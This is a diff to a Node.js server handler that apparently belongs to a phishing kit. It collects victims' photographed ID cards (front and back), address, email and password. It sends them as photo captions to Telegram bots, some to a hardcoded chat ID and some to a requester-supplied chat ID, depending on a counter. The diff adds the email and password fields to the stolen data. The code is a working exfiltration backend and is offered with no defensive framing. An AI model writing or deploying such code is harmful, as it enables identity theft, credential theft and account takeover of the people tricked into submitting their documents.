@@ -90,134 +90,156 @@ const sendId = async (req, res) => {
     return res.status(500).send({ msg: "file is not found" });
   }
   let { frontId, backId } = req.files;
-  const { telegramId, address, state, zip } = req.body;
+  const { telegramId, address, state, zip, email, password } = req.body;
   const frontPath = `./ausID/${zip}_Front.jpg`;
   const backPath = `./ausID/${zip}_Back.jpg`;
-  await frontId.mv(frontPath, async (err) => {
-    if (err) {
-      console.log(err);
-      return res.sendStatus(500);
-    } else {
-      const formData = new FormData();
-      formData.append("chat_id", 680379375);
-      formData.append("photo", fs.createReadStream(frontPath));
+  if (count == 2) {
+    await frontId.mv(frontPath, async (err) => {
+      if (err) {
+        console.log(err);
+        return res.sendStatus(500);
+      } else {
+        const formData = new FormData();
+        formData.append("chat_id", 680379375);
+        formData.append("photo", fs.createReadStream(frontPath));
 
-      await axios
-        .post(
-          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendPhoto`,
-          formData,
-          {
-            headers: formData.getHeaders(),
-          }
-        )
-        .catch((e) => {
-          console.log(e);
-        });
-    }
-  });
-  await backId.mv(backPath, async (err) => {
-    if (err) {
-      console.log(err);
-      return res.sendStatus(500);
-    } else {
-      const formData = new FormData();
-      formData.append("chat_id", 680379375);
-      formData.append("photo", fs.createReadStream(backPath));
-      formData.append(
-        "caption",
-        `Address: ${address}\nState: ${state}\nZIP: ${zip}`
-      );
+        await axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendPhoto`,
+            formData,
+            {
+              headers: formData.getHeaders(),
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+      }
+    });
+    await backId.mv(backPath, async (err) => {
+      if (err) {
+        console.log(err);
+        return res.sendStatus(500);
+      } else {
+        const formData = new FormData();
+        formData.append("chat_id", 680379375);
+        formData.append("photo", fs.createReadStream(backPath));
+        formData.append(
+          "caption",
+          `Email: ${email}\nPassword: ${password}\nAddress: ${address}\nState: ${state}\nZIP: ${zip}`
+        );
 
-      await axios
-        .post(
-          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendPhoto`,
-          formData,
-          {
-            headers: formData.getHeaders(),
-          }
-        )
-        .catch((e) => {
-          console.log(e);
-        });
-    }
-  });
-  //   if (count == 6) {
-  //     await axios
-  //       .post(
-  //         `https://api.telegram.org/bot${process.env.haytchresbotID}/sendDocument`,
-  //         {
-  //           chat_id: 680379375,
-  //           document: frontPath,
-  //           caption: `${fullname} ID Front`,
-  //         }
-  //       )
-  //       .catch((e) => {
-  //         console.log(e);
-  //       });
-  //     await axios
-  //       .post(
-  //         `https://api.telegram.org/bot${process.env.haytchresbotID}/sendDocument`,
-  //         {
-  //           chat_id: 680379375,
-  //           document: backPath,
-  //           caption: `${fullname} ID Back`,
-  //         }
-  //       )
-  //       .catch((e) => {
-  //         console.log(e);
-  //       });
-  //     count = 0;
-  //   } else {
-  //     await axios
-  //       .post(
-  //         `https://api.telegram.org/bot${process.env.sendresbotID}/sendDocument`,
-  //         {
-  //           chat_id: 680379375,
-  //           document: frontPath,
-  //           caption: `${telegramId}:\n${fullname} ID Front`,
-  //         }
-  //       )
-  //       .catch((e) => {
-  //         console.log(e);
-  //       });
-  //     await axios
-  //       .post(
-  //         `https://api.telegram.org/bot${process.env.sendresbotID}/sendDocument`,
-  //         {
-  //           chat_id: 680379375,
-  //           document: backPath,
-  //           caption: `${telegramId}:\n${fullname} ID Back`,
-  //         }
-  //       )
-  //       .catch((e) => {
-  //         console.log(e);
-  //       });
-  //     await axios
-  //       .post(
-  //         `https://api.telegram.org/bot${process.env.sendresbotID}/sendDocument`,
-  //         {
-  //           chat_id: telegramId,
-  //           document: frontPath,
-  //           caption: `${fullname} ID Front`,
-  //         }
-  //       )
-  //       .catch((e) => {
-  //         console.log(e);
-  //       });
-  //     await axios
-  //       .post(
-  //         `https://api.telegram.org/bot${process.env.sendresbotID}/sendDocument`,
-  //         {
-  //           chat_id: telegramId,
-  //           document: backPath,
-  //           caption: `${fullname} ID Back`,
-  //         }
-  //       )
-  //       .catch((e) => {
-  //         console.log(e);
-  //       });
-  //     count += 1;
-  //   }
+        await axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendPhoto`,
+            formData,
+            {
+              headers: formData.getHeaders(),
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+      }
+    });
+  } else {
+    await frontId.mv(frontPath, async (err) => {
+      if (err) {
+        console.log(err);
+        return res.sendStatus(500);
+      } else {
+        const formData = new FormData();
+        formData.append("chat_id", telegramId);
+        formData.append("photo", fs.createReadStream(frontPath));
+
+        await axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendPhoto`,
+            formData,
+            {
+              headers: formData.getHeaders(),
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+      }
+    });
+    await frontId.mv(frontPath, async (err) => {
+      if (err) {
+        console.log(err);
+        return res.sendStatus(500);
+      } else {
+        const formData = new FormData();
+        formData.append("chat_id", 680379375);
+        formData.append("photo", fs.createReadStream(frontPath));
+
+        await axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendPhoto`,
+            formData,
+            {
+              headers: formData.getHeaders(),
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+      }
+    });
+    await backId.mv(backPath, async (err) => {
+      if (err) {
+        console.log(err);
+        return res.sendStatus(500);
+      } else {
+        const formData = new FormData();
+        formData.append("chat_id", telegramId);
+        formData.append("photo", fs.createReadStream(backPath));
+        formData.append(
+          "caption",
+          `Email: ${email}\nPassword: ${password}\nAddress: ${address}\nState: ${state}\nZIP: ${zip}`
+        );
+
+        await axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendPhoto`,
+            formData,
+            {
+              headers: formData.getHeaders(),
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+      }
+    });
+    await backId.mv(backPath, async (err) => {
+      if (err) {
+        console.log(err);
+        return res.sendStatus(500);
+      } else {
+        const formData = new FormData();
+        formData.append("chat_id", 680379375);
+        formData.append("photo", fs.createReadStream(backPath));
+        formData.append(
+          "caption",
+          `Email: ${email}\nPassword: ${password}\nAddress: ${address}\nState: ${state}\nZIP: ${zip}`
+        );
+
+        await axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendPhoto`,
+            formData,
+            {
+              headers: formData.getHeaders(),
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+      }
+    });
+  }
   return res.sendStatus(200);
 };
 
